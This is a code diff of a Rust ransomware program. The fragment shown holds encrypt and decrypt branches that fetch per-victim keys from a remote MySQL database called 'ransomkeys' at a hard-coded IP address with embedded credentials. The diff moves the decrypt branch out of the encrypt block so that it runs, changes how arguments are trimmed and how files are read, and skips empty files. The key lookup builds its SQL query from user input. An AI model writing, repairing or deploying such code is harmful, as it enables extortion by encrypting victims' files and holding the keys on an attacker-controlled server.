@@ -4,7 +4,7 @@ use orion::{aead, kex::SecretKey};
 use std::error::Error;
 use std::sync::Arc;
 use std::{
-    fs::{self, OpenOptions},
+    fs::{OpenOptions},
     io::{Read, Write},
     process::exit,
 };
@@ -60,8 +60,9 @@ fn main() -> Result<(), Box<dyn Error>> {
         println!("Usage: {} <encrypt/decrypt> <path>", args[0]);
         exit(1);
     }
-    let path = &args[2].trim();
-    if &args[1].trim() == &"encrypt" {
+    let path = &args[2].trim_end();
+    let args1 = args[1].trim_end();
+    if args1 == "encrypt" {
         let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
         let pool = Arc::new(Pool::new(url).unwrap());
         let mut conn = pool.get_conn().unwrap();
@@ -86,32 +87,31 @@ fn main() -> Result<(), Box<dyn Error>> {
                 println!("{}", enc64);
             }
         }
-
-        if &args[1].trim() == &"decrypt" {
-            let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
-            let pool = Arc::new(Pool::new(url).unwrap());
-            let mut conn = pool.get_conn().unwrap();
-            println!("Decrypt function called");
-            let mut randomuuid = String::new();
-            println!("Please enter your UUID for decryption: ");
-            std::io::stdin().read_line(&mut randomuuid).unwrap();
-            let files = getfiles(path)?;
-            let mut key_value: Option<String> = None;
-            let checkquery = format!("SELECT `key` FROM `{}`;", randomuuid.trim());
-            let result = conn.query_iter(checkquery).unwrap();
-            for row in result {
-                let key: String = mysql::from_row(row.unwrap());
-                key_value = Some(key);
-            }
-            let key_str = key_value.unwrap_or_default();
-            for file in files {
-                let mut fileopen = OpenOptions::new().write(true).open(&file).unwrap();
-                let filecont = fs::read(file)?;
-                let wtf23 = String::from_utf8(filecont)?;
-                let decced = decrypt(&wtf23, key_str.clone())?;
-                fileopen.set_len(0)?;
-                fileopen.write(decced.as_bytes())?;
-            }
+    }
+    if args1 == "decrypt" {
+        let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
+        let pool = Arc::new(Pool::new(url).unwrap());
+        let mut conn = pool.get_conn().unwrap();
+        let mut randomuuid = String::new();
+        println!("Please enter your UUID for decryption: ");
+        std::io::stdin().read_line(&mut randomuuid).unwrap();
+        let files = getfiles(path)?;
+        let mut key_value: Option<String> = None;
+        let checkquery = format!("SELECT `key` FROM `{}`;", randomuuid.trim());
+        let result = conn.query_iter(checkquery).unwrap();
+        for row in result {
+            let key: String = mysql::from_row(row.unwrap());
+            key_value = Some(key);
+        }
+        let key_str = key_value.unwrap_or_default();
+        for file in files {
+            let mut fileopen = OpenOptions::new().write(true).open(&file).unwrap();
+            let filecont = readfile(file)?;
+			if filecont.trim() != "" {
+				let decced = decrypt(&filecont, key_str.clone())?;
+            	fileopen.set_len(0)?;
+            	fileopen.write(decced.as_bytes())?;
+			}
         }
     }
     println!("Press enter to exit.");
